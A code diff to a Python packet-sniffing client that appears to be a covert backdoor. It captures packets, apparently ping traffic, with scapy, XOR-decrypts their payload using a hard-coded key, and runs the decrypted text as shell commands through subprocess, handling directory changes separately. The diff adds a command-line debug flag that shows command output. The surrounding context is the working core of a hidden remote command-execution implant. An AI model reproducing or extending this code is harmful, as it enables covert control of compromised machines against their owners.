@@ -8,16 +8,17 @@ from scapy.all import AsyncSniffer, Packet
 import subprocess
 import os
 import re
+import argparse
 from time import sleep
 
 key = "ringring"
+debug = False
 
 
 def decrypt(ciphertext):
     """
     Decrypt a message encrypted with the XOR cipher with the given key.
     """
-    global key
     key_bytes = key.encode()
     message = bytearray()
     for i, b in enumerate(bytes.fromhex(ciphertext)):
@@ -44,7 +45,7 @@ def sniffHandle(packet: Packet) -> None:
             path = cd_match.group(1)
             os.chdir(path=path)
         else:
-            subprocess.run(decodedCommand, shell=True, capture_output=True)
+            subprocess.run(decodedCommand, shell=True, capture_output=not debug)
     # the linux ping command passes some weird format in the raw load so this is to catch it, ultimately it doesn't matter if catch it
     except UnicodeDecodeError:
         print("Oh well")
@@ -68,6 +69,15 @@ def sniffer() -> None:
 
 def main() -> None:
     """Runs the client handling the packets"""
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")
+    args = parser.parse_args()
+
+    # Check if the debug flag is set
+    if args.debug:
+        global debug
+        debug = True
+
     sniffer()
 
 
